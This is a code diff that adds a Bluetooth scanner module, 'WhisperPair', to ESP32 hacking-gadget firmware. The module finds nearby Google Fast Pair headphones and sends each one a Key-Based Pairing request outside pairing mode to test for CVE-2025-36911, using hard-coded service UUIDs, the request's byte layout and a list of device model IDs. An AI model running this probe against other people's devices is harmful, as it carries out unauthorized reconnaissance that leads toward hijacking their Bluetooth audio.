@@ -4448,3 +4448,716 @@ void cleanup() {
 }
 
 }  // namespace BleSniffer
+
+
+// ═══════════════════════════════════════════════════════════════════════════
+// WHISPERPAIR - CVE-2025-36911 Fast Pair Vulnerability Scanner
+// Scans for Google Fast Pair devices and probes for WhisperPair vulnerability
+// Phase 1: Discovery + GATT Service Probe
+// ═══════════════════════════════════════════════════════════════════════════
+
+namespace WhisperPair {
+
+// ─── Constants ───────────────────────────────────────────────────────────
+#define WP_MAX_DEVICES 16
+#define WP_LINE_HEIGHT 16
+#define WP_MAX_VISIBLE 12
+#define WP_SCAN_SECS 8
+
+// ─── Probe Result Codes ──────────────────────────────────────────────────
+#define WPR_NONE        0   // Not probed yet
+#define WPR_UNREACHABLE 1   // GATT connection failed
+#define WPR_NO_SERVICE  2   // Fast Pair service not found
+#define WPR_NO_CHAR     3   // KBP characteristic not found (patched)
+#define WPR_EXPOSED     4   // KBP char found outside pairing mode
+#define WPR_VULNERABLE  5   // Device responded to KBP request
+
+// ─── Known Fast Pair Model IDs ───────────────────────────────────────────
+// Same model IDs as BleSpoofer FAST_PAIR_MODELS array (verified working)
+struct WPModel {
+    uint8_t id[3];
+    const char* name;
+};
+
+static const WPModel wpModels[] = {
+    {{0xD9, 0x93, 0x30}, "Pixel Buds Pro"},
+    {{0x82, 0x1F, 0x66}, "Pixel Buds A"},
+    {{0x71, 0x7F, 0x41}, "Pixel Buds"},
+    {{0xF5, 0x24, 0x94}, "Sony WH-XM4"},
+    {{0xF0, 0x09, 0x17}, "Sony WH-XM5"},
+    {{0x01, 0x00, 0x06}, "Bose NC 700"},
+    {{0xEF, 0x44, 0x63}, "Bose QC Ultra"},
+    {{0x03, 0x1E, 0x06}, "JBL Flip 6"},
+    {{0x92, 0xB2, 0x5E}, "JBL LivePro2"},
+    {{0x1E, 0x89, 0xA7}, "Razer HH"},
+    {{0x02, 0xAA, 0x91}, "Jabra 75t"},
+    {{0x2D, 0x7A, 0x23}, "Nothing Ear1"},
+    {{0xD4, 0x46, 0xA7}, "Sony LinkBuds"},
+    {{0x72, 0xEF, 0x62}, "Gal Buds FE"},
+    {{0xF5, 0x8D, 0x14}, "JBL Buds Pro"},
+};
+#define WP_MODEL_COUNT (sizeof(wpModels) / sizeof(wpModels[0]))
+
+// ─── Device Info ─────────────────────────────────────────────────────────
+struct FPDevice {
+    char addrStr[18];               // "AA:BB:CC:DD:EE:FF"
+    esp_ble_addr_type_t addrType;
+    uint32_t modelId;
+    int rssi;
+    char name[24];
+    uint8_t result;                 // WPR_* code
+};
+
+// ─── State ───────────────────────────────────────────────────────────────
+static bool wpInit = false;
+static bool wpExit = false;
+static bool inResult = false;
+static FPDevice wpDevs[WP_MAX_DEVICES];
+static int wpCount = 0;
+static int wpCurIdx = 0;
+static int wpListStart = 0;
+static int wpProbeIdx = -1;
+static BLEScan* pWpScan = nullptr;
+static BLEClient* pWpClient = nullptr;
+static volatile bool wpNotifRx = false;
+
+// GATT UUIDs
+static BLEUUID wpFpUUID16((uint16_t)0xFE2C);
+static BLEUUID wpFpUUID128("0000fe2c-0000-1000-8000-00805f9b34fb");
+static BLEUUID wpKbpUUID("fe2c1234-8366-4814-8eb0-01de32100bea");
+
+// Icon bar
+static int wpIconX[2] = {210, 10};
+static int wpIconY = 20;
+
+// ─── Helpers ─────────────────────────────────────────────────────────────
+static const char* wpLookupModel(uint32_t mid) {
+    for (int i = 0; i < (int)WP_MODEL_COUNT; i++) {
+        uint32_t m = ((uint32_t)wpModels[i].id[0] << 16) |
+                     ((uint32_t)wpModels[i].id[1] << 8) |
+                     wpModels[i].id[2];
+        if (m == mid) return wpModels[i].name;
+    }
+    return nullptr;
+}
+
+static const char* wpResultStr(uint8_t r) {
+    switch (r) {
+        case WPR_UNREACHABLE: return "UNREACHABLE";
+        case WPR_NO_SERVICE:  return "NO FP SERVICE";
+        case WPR_NO_CHAR:     return "SECURE";
+        case WPR_EXPOSED:     return "EXPOSED";
+        case WPR_VULNERABLE:  return "VULNERABLE";
+        default:              return "NOT TESTED";
+    }
+}
+
+static uint16_t wpResultColor(uint8_t r) {
+    switch (r) {
+        case WPR_NO_CHAR:     return 0x07E0;   // Green
+        case WPR_EXPOSED:     return 0xFFE0;   // Yellow
+        case WPR_VULNERABLE:  return 0xF800;   // Red
+        default:              return HALEHOUND_GUNMETAL;
+    }
+}
+
+// ─── Notification Callback ───────────────────────────────────────────────
+static void wpNotifyCb(BLERemoteCharacteristic* pChar, uint8_t* data, size_t len, bool isNotify) {
+    wpNotifRx = true;
+    #if CYD_DEBUG
+    Serial.printf("[WP] KBP notification received! len=%d\n", len);
+    #endif
+}
+
+// ─── UI Drawing ──────────────────────────────────────────────────────────
+static void wpDrawHeader() {
+    tft.drawLine(0, 19, tft.width(), 19, HALEHOUND_MAGENTA);
+    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
+    tft.drawBitmap(wpIconX[0], wpIconY, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
+    tft.drawBitmap(wpIconX[1], wpIconY, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
+    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
+    // Nosifer glitch title — chromatic aberration effect
+    drawGlitchTitle(55, "WHISPERPAIR");
+    // CVE subtitle centered in electric blue
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    int cveW = 14 * 6;
+    tft.setCursor((SCREEN_WIDTH - cveW) / 2, 68);
+    tft.print("CVE-2025-36911");
+}
+
+static void wpDrawList() {
+    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
+
+    // Sub-header bar — dark background like spoofer mode bar
+    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(5, 82);
+    tft.print("Fast Pair Targets: ");
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.print(wpCount);
+    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);
+
+    if (wpCount == 0) {
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(10, 105);
+        tft.print("No Fast Pair devices");
+        tft.setCursor(10, 120);
+        tft.print("found nearby.");
+        tft.setTextColor(HALEHOUND_VIOLET);
+        tft.setCursor(10, 145);
+        tft.print("Ensure targets are powered");
+        tft.setCursor(10, 158);
+        tft.print("on and within BLE range.");
+        tft.setTextColor(HALEHOUND_HOTPINK);
+        tft.setCursor(5, SCREEN_HEIGHT - 12);
+        tft.print("SEL=Rescan  BACK=Exit");
+        return;
+    }
+
+    int y = 98;
+    for (int i = 0; i < WP_MAX_VISIBLE && i + wpListStart < wpCount; i++) {
+        int idx = i + wpListStart;
+        FPDevice& d = wpDevs[idx];
+
+        if (idx == wpCurIdx) {
+            tft.fillRect(0, y - 2, SCREEN_WIDTH, WP_LINE_HEIGHT, HALEHOUND_DARK);
+            tft.setTextColor(HALEHOUND_HOTPINK);
+            tft.setCursor(5, y);
+            tft.print("> ");
+        } else {
+            tft.setTextColor(HALEHOUND_MAGENTA);
+            tft.setCursor(5, y);
+            tft.print("  ");
+        }
+
+        tft.setCursor(20, y);
+        String nm = String(d.name).substring(0, 14);
+        tft.print(nm);
+
+        if (d.result != WPR_NONE) {
+            tft.setCursor(SCREEN_WIDTH - 65, y);
+            tft.setTextColor(wpResultColor(d.result));
+            if (d.result == WPR_VULNERABLE) tft.print("VULN");
+            else if (d.result == WPR_EXPOSED) tft.print("EXPD");
+            else if (d.result == WPR_NO_CHAR) tft.print("OK");
+            else tft.print("--");
+        } else {
+            tft.setCursor(SCREEN_WIDTH - 50, y);
+            tft.setTextColor(HALEHOUND_VIOLET);
+            tft.print(d.rssi);
+            tft.print("dB");
+        }
+
+        y += WP_LINE_HEIGHT;
+    }
+
+    tft.drawLine(0, SCREEN_HEIGHT - 18, SCREEN_WIDTH, SCREEN_HEIGHT - 18, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(5, SCREEN_HEIGHT - 12);
+    tft.print("SEL=Probe UP/DN=Nav L=Scan");
+}
+
+static void wpDrawProbeStatus(int line, const char* msg, uint16_t col) {
+    int y = 135 + line * 15;
+    tft.fillRect(0, y, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
+    tft.setTextColor(col);
+    tft.setCursor(10, y);
+    tft.print(msg);
+}
+
+static void wpDrawResult() {
+    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
+
+    FPDevice& d = wpDevs[wpProbeIdx];
+
+    // Sub-header bar
+    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(5, 82);
+    tft.print("PROBE RESULT");
+    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);
+
+    int y = 100;
+    // Labels in electric blue, values in hot pink
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(10, y); tft.print("Name: ");
+    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
+    y += 15;
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(10, y); tft.print("MAC:  ");
+    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
+    y += 15;
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(10, y); tft.print("RSSI: ");
+    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.rssi); tft.print(" dBm");
+    y += 15;
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    char modelHex[16];
+    snprintf(modelHex, sizeof(modelHex), "0x%06X", d.modelId);
+    tft.setCursor(10, y); tft.print("Model: ");
+    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(modelHex);
+    y += 20;
+
+    // Result banner with rounded border
+    tft.drawLine(0, y - 4, SCREEN_WIDTH, y - 4, HALEHOUND_DARK);
+    uint16_t rc = wpResultColor(d.result);
+    tft.fillRoundRect(8, y, SCREEN_WIDTH - 16, 26, 4, rc);
+    tft.drawRoundRect(7, y - 1, SCREEN_WIDTH - 14, 28, 4, HALEHOUND_MAGENTA);
+    tft.setTextColor(HALEHOUND_BLACK);
+    const char* rs = wpResultStr(d.result);
+    int tw = strlen(rs) * 6;
+    tft.setCursor((SCREEN_WIDTH - tw) / 2, y + 8);
+    tft.print(rs);
+    y += 36;
+
+    // Explanation text
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    switch (d.result) {
+        case WPR_VULNERABLE:
+            tft.setCursor(10, y);
+            tft.print("Device responded to KBP");
+            tft.setCursor(10, y + 14);
+            tft.print("request outside pair mode");
+            tft.setCursor(10, y + 30);
+            tft.setTextColor(0xF800);
+            tft.print("CVE-2025-36911 CONFIRMED");
+            break;
+        case WPR_EXPOSED:
+            tft.setCursor(10, y);
+            tft.print("KBP characteristic found");
+            tft.setCursor(10, y + 14);
+            tft.print("outside pairing mode.");
+            tft.setCursor(10, y + 30);
+            tft.setTextColor(0xFFE0);
+            tft.print("Potentially vulnerable");
+            break;
+        case WPR_NO_CHAR:
+            tft.setCursor(10, y);
+            tft.print("FP service present but");
+            tft.setCursor(10, y + 14);
+            tft.print("KBP char not exposed.");
+            tft.setCursor(10, y + 30);
+            tft.setTextColor(0x07E0);
+            tft.print("Appears patched");
+            break;
+        case WPR_NO_SERVICE:
+            tft.setCursor(10, y);
+            tft.print("Fast Pair GATT service");
+            tft.setCursor(10, y + 14);
+            tft.print("not accessible via GATT");
+            break;
+        case WPR_UNREACHABLE:
+            tft.setCursor(10, y);
+            tft.print("GATT connection failed.");
+            tft.setCursor(10, y + 14);
+            tft.print("Target may be out of range");
+            break;
+    }
+
+    tft.drawLine(0, SCREEN_HEIGHT - 18, SCREEN_WIDTH, SCREEN_HEIGHT - 18, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(5, SCREEN_HEIGHT - 12);
+    tft.print("BACK=Device List");
+}
+
+// ─── Scan ────────────────────────────────────────────────────────────────
+static void wpDoScan() {
+    wpCount = 0;
+    wpCurIdx = 0;
+    wpListStart = 0;
+
+    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(10, 88);
+    tft.print("[*] FAST PAIR SCAN ACTIVE");
+    tft.drawLine(10, 98, 200, 98, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(10, 108);
+    tft.print("Hunting targets...");
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(10, 128);
+    tft.print("Scan duration: ");
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.print(WP_SCAN_SECS);
+    tft.print("s");
+
+    BLEScanResults results = pWpScan->start(WP_SCAN_SECS, false);
+
+    int total = results.getCount();
+    #if CYD_DEBUG
+    Serial.printf("[WP] Scan got %d total BLE devices\n", total);
+    #endif
+
+    for (int i = 0; i < total && wpCount < WP_MAX_DEVICES; i++) {
+        BLEAdvertisedDevice device = results.getDevice(i);
+        if (!device.haveServiceData()) continue;
+
+        BLEUUID sdUUID = device.getServiceDataUUID();
+        if (!sdUUID.equals(BLEUUID((uint16_t)0xFE2C))) continue;
+
+        std::string sd = device.getServiceData();
+        if (sd.length() < 3) continue;
+
+        // Check duplicate MAC
+        String addr = String(device.getAddress().toString().c_str());
+        bool dup = false;
+        for (int j = 0; j < wpCount; j++) {
+            if (addr.equals(wpDevs[j].addrStr)) { dup = true; break; }
+        }
+        if (dup) continue;
+
+        FPDevice& d = wpDevs[wpCount];
+        strncpy(d.addrStr, addr.c_str(), 17);
+        d.addrStr[17] = '\0';
+        d.addrType = device.getAddressType();
+        d.rssi = device.getRSSI();
+        d.result = WPR_NONE;
+
+        // Extract model ID (3 bytes big-endian)
+        d.modelId = ((uint32_t)(uint8_t)sd[0] << 16) |
+                    ((uint32_t)(uint8_t)sd[1] << 8)  |
+                    (uint8_t)sd[2];
+
+        const char* known = wpLookupModel(d.modelId);
+        if (known) {
+            strncpy(d.name, known, 23);
+        } else if (device.getName().length() > 0) {
+            strncpy(d.name, device.getName().c_str(), 23);
+        } else {
+            snprintf(d.name, 24, "FP:%06X", d.modelId);
+        }
+        d.name[23] = '\0';
+
+        wpCount++;
+
+        #if CYD_DEBUG
+        Serial.printf("[WP] FP device: %s [%s] RSSI:%d Model:0x%06X\n",
+                      d.name, d.addrStr, d.rssi, d.modelId);
+        #endif
+    }
+
+    wpDrawList();
+}
+
+// ─── GATT Probe ──────────────────────────────────────────────────────────
+static void wpProbeDevice(int idx) {
+    wpProbeIdx = idx;
+    inResult = false;
+    FPDevice& d = wpDevs[idx];
+    wpNotifRx = false;
+    d.result = WPR_UNREACHABLE;
+
+    // Stop scan before GATT client operations
+    if (pWpScan) pWpScan->stop();
+
+    // Draw probe UI
+    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(5, 82);
+    tft.print("[*] PROBING TARGET");
+    tft.drawLine(5, 94, 180, 94, HALEHOUND_DARK);
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(10, 100);
+    tft.print(d.name);
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(10, 115);
+    tft.print(d.addrStr);
+
+    // Create or reuse GATT client
+    if (!pWpClient) {
+        pWpClient = BLEDevice::createClient();
+        if (!pWpClient) {
+            #if CYD_DEBUG
+            Serial.println("[WP] Failed to create BLE client");
+            #endif
+            inResult = true;
+            wpDrawResult();
+            return;
+        }
+    }
+
+    // Attempt GATT connection
+    wpDrawProbeStatus(0, "Connecting...", HALEHOUND_HOTPINK);
+    BLEAddress addr(d.addrStr);
+    bool connected = pWpClient->connect(addr, d.addrType);
+
+    if (!connected) {
+        #if CYD_DEBUG
+        Serial.printf("[WP] GATT connect failed: %s\n", d.addrStr);
+        #endif
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    wpDrawProbeStatus(0, "Connected!", HALEHOUND_MAGENTA);
+    #if CYD_DEBUG
+    Serial.printf("[WP] Connected to %s\n", d.addrStr);
+    #endif
+
+    // Discover Fast Pair service (try 128-bit then 16-bit UUID)
+    wpDrawProbeStatus(1, "Finding FP service...", HALEHOUND_HOTPINK);
+    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
+    if (!pSvc) {
+        pSvc = pWpClient->getService(wpFpUUID16);
+    }
+
+    if (!pSvc) {
+        d.result = WPR_NO_SERVICE;
+        pWpClient->disconnect();
+        #if CYD_DEBUG
+        Serial.println("[WP] Fast Pair service not found");
+        #endif
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    wpDrawProbeStatus(1, "FP Service FOUND!", HALEHOUND_MAGENTA);
+    delay(200);
+
+    // Find Key-Based Pairing characteristic
+    wpDrawProbeStatus(2, "Finding KBP char...", HALEHOUND_HOTPINK);
+    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);
+
+    if (!pKbp) {
+        d.result = WPR_NO_CHAR;
+        pWpClient->disconnect();
+        #if CYD_DEBUG
+        Serial.println("[WP] KBP char not found — device appears patched");
+        #endif
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    // KBP characteristic accessible outside pairing mode!
+    wpDrawProbeStatus(2, "KBP Char FOUND!", HALEHOUND_HOTPINK);
+    d.result = WPR_EXPOSED;
+
+    #if CYD_DEBUG
+    Serial.println("[WP] KBP characteristic accessible outside pairing mode!");
+    #endif
+
+    // Subscribe to notifications
+    if (pKbp->canNotify()) {
+        pKbp->registerForNotify(wpNotifyCb);
+        delay(100);
+    }
+
+    // Write test KBP request (16 bytes)
+    // Byte 0: Message type (0x00 = Key-Based Pairing Request)
+    // Byte 1: Flags (0x40 = request provider BR/EDR address)
+    // Bytes 4-9: Target BLE address from advertisement
+    // Bytes 10-15: Random salt
+    wpDrawProbeStatus(3, "Sending KBP request...", HALEHOUND_HOTPINK);
+
+    uint8_t kbpReq[16];
+    kbpReq[0] = 0x00;  // KBP Request message type
+    kbpReq[1] = 0x40;  // Flags
+    kbpReq[2] = 0x00;
+    kbpReq[3] = 0x00;
+    for (int i = 4; i < 16; i++) kbpReq[i] = (uint8_t)random(256);
+
+    // Parse target address into request bytes 4-9
+    uint8_t addrBytes[6];
+    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &addrBytes[0], &addrBytes[1], &addrBytes[2],
+           &addrBytes[3], &addrBytes[4], &addrBytes[5]);
+    memcpy(&kbpReq[4], addrBytes, 6);
+
+    // Write the request (try write-with-response first)
+    if (pKbp->canWrite()) {
+        pKbp->writeValue(kbpReq, 16, true);
+    } else {
+        pKbp->writeValue(kbpReq, 16, false);
+    }
+
+    // Wait up to 3 seconds for notification response
+    wpDrawProbeStatus(3, "Waiting for response...", HALEHOUND_HOTPINK);
+    unsigned long t0 = millis();
+    while (millis() - t0 < 3000 && !wpNotifRx) {
+        delay(50);
+    }
+
+    if (wpNotifRx) {
+        d.result = WPR_VULNERABLE;
+        wpDrawProbeStatus(3, "RESPONSE RECEIVED!", 0xF800);
+        delay(500);
+        #if CYD_DEBUG
+        Serial.println("[WP] VULNERABLE — responded to KBP outside pairing mode!");
+        #endif
+    }
+
+    // Disconnect
+    pWpClient->disconnect();
+
+    inResult = true;
+    wpDrawResult();
+}
+
+// ─── Public Interface ────────────────────────────────────────────────────
+void setup() {
+    if (wpInit) return;
+
+    #if CYD_DEBUG
+    Serial.println("[WP] WhisperPair Scanner initializing...");
+    #endif
+
+    tft.fillScreen(HALEHOUND_BLACK);
+    drawStatusBar();
+    wpDrawHeader();
+
+    BLEDevice::init("");
+    delay(150);
+
+    pWpScan = BLEDevice::getScan();
+    if (!pWpScan) {
+        Serial.println("[WP] getScan() returned NULL");
+        wpExit = true;
+        return;
+    }
+
+    pWpScan->setActiveScan(true);
+    pWpScan->setInterval(100);
+    pWpScan->setWindow(99);
+
+    wpCount = 0;
+    wpCurIdx = 0;
+    wpListStart = 0;
+    wpProbeIdx = -1;
+    wpExit = false;
+    inResult = false;
+    pWpClient = nullptr;
+    wpInit = true;
+
+    wpDoScan();
+
+    #if CYD_DEBUG
+    Serial.printf("[WP] Init complete — %d FP devices found\n", wpCount);
+    #endif
+}
+
+void loop() {
+    if (!wpInit) return;
+
+    touchButtonsUpdate();
+
+    // Icon bar touch handling
+    static unsigned long lastTap = 0;
+    if (millis() - lastTap > 200) {
+        uint16_t tx, ty;
+        if (getTouchPoint(&tx, &ty)) {
+            if (ty >= 20 && ty <= 36) {
+                if (tx >= 10 && tx < 26) {
+                    // Back icon
+                    if (inResult) {
+                        inResult = false;
+                        tft.fillScreen(HALEHOUND_BLACK);
+                        drawStatusBar();
+                        wpDrawHeader();
+                        wpDrawList();
+                    } else {
+                        wpExit = true;
+                    }
+                    lastTap = millis();
+                    return;
+                }
+                else if (tx >= 210 && tx < 226) {
+                    // Rescan icon
+                    if (!inResult) {
+                        wpDoScan();
+                    }
+                    lastTap = millis();
+                    return;
+                }
+            }
+        }
+    }
+
+    // Button handling
+    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+        if (inResult) {
+            inResult = false;
+            tft.fillScreen(HALEHOUND_BLACK);
+            drawStatusBar();
+            wpDrawHeader();
+            wpDrawList();
+        } else {
+            wpExit = true;
+        }
+        return;
+    }
+
+    if (!inResult) {
+        // Device list navigation
+        if (buttonPressed(BTN_UP)) {
+            if (wpCurIdx > 0) {
+                wpCurIdx--;
+                if (wpCurIdx < wpListStart) wpListStart--;
+                wpDrawList();
+            }
+        }
+
+        if (buttonPressed(BTN_DOWN)) {
+            if (wpCurIdx < wpCount - 1) {
+                wpCurIdx++;
+                if (wpCurIdx >= wpListStart + WP_MAX_VISIBLE) wpListStart++;
+                wpDrawList();
+            }
+        }
+
+        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_RIGHT)) {
+            if (wpCount > 0) {
+                wpProbeDevice(wpCurIdx);
+            } else {
+                wpDoScan();
+            }
+        }
+
+        if (buttonPressed(BTN_LEFT)) {
+            wpDoScan();
+        }
+
+        // Touch to select device
+        int visCount = wpCount - wpListStart;
+        if (visCount > WP_MAX_VISIBLE) visCount = WP_MAX_VISIBLE;
+        int touched = getTouchedMenuItem(60, WP_LINE_HEIGHT, visCount);
+        if (touched >= 0) {
+            wpCurIdx = wpListStart + touched;
+            wpProbeDevice(wpCurIdx);
+        }
+    } else {
+        // Result view — LEFT returns to list
+        if (buttonPressed(BTN_LEFT)) {
+            inResult = false;
+            tft.fillScreen(HALEHOUND_BLACK);
+            drawStatusBar();
+            wpDrawHeader();
+            wpDrawList();
+        }
+    }
+}
+
+bool isExitRequested() { return wpExit; }
+
+void cleanup() {
+    if (pWpClient) {
+        pWpClient->disconnect();
+        pWpClient = nullptr;  // deinit cleans up tracked clients
+    }
+    if (pWpScan) pWpScan->stop();
+    BLEDevice::deinit(false);
+    wpInit = false;
+    wpExit = false;
+    inResult = false;
+    wpCount = 0;
+    wpProbeIdx = -1;
+
+    #if CYD_DEBUG
+    Serial.println("[WP] Cleanup complete");
+    #endif
+}
+
+}  // namespace WhisperPair
